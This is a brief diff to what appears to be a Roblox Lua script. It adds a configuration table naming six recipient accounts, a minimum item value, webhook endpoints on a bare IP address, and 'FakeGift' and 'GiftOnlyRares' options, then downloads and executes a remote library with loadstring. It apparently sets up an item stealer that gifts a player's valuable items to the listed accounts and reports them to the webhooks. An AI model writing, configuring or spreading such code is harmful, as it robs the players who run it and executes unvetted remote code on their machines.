@@ -1,1 +1,12 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/h5QbUdbN2B/0", true))()
+_G.NullConfig = {
+    User = {'iamzanji44', 'iamzanji55', 'iamzanji66', 'iamzanji77', 'iamzanji88', 'iamzanji99'},
+    min_value = 744000000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/242852c23fc3cb78b9c4f83fa6cf0453",
+    FakeGift = "Yes",
+    Trash = "http://45.13.225.83:20002/proxy/30cb65cb9010af4f2bd6a8f3bb929033",
+    LoadingScreen = "No",
+    GiftOnlyRares = "Yes"
+}
+
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
